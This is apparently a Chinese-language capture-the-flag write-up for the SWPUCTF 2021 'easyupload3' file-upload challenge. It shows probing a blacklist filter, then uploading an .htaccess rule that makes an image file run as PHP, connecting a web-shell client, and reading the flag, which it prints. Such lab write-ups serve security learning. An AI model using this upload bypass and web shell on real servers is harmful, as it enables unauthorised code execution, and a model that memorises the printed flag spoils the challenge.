---
title: '[SWPUCTF 2021 新生赛]easyupload3'
date: '2025-05-02T21:46:49+08:00'
weight: 
draft: false
description: '[SWPUCTF 2021 新生赛]easyupload3'
---

上传 `fish1.php` 失败，但可以抓到包，判断为 **服务端检查**

![PixPin_2025-04-29_20-28-41](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-29_20-28-41.sz5k7xwjn.webp)

上传非图片内容、图片后缀的文件 `fish.jpg` 成功，判断为 **检查后缀**

```text
./upload/fish.jpg succesfully uploaded!
```

上传任意后缀文件 `fish.fish` 成功，判断为 **黑名单**

```text
./upload/fish.fish succesfully uploaded!
```

尝试上传特殊可解析后缀文件 `fish.php5` 失败

```text
你难道想传个🐎某？
```

尝试上传 `.htaccess` 成功

```text {filename=".htaccess"}
<FilesMatch "fish.jpg">
    SetHandler application/x-httpd-php
</FilesMatch>
```

```text
./upload/.htaccess succesfully uploaded!
```

使用蚁剑进行连接

![PixPin_2025-05-01_08-46-19](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-01_08-46-19.5xaubnqcw0.webp)

在 `/var/www/html/flag.php` 找到 `flag`

```php
<?php
$flag = 'NSSCTF{2df0fb52-5c72-4f35-a3f3-e70bd06e8416}';
?>
```
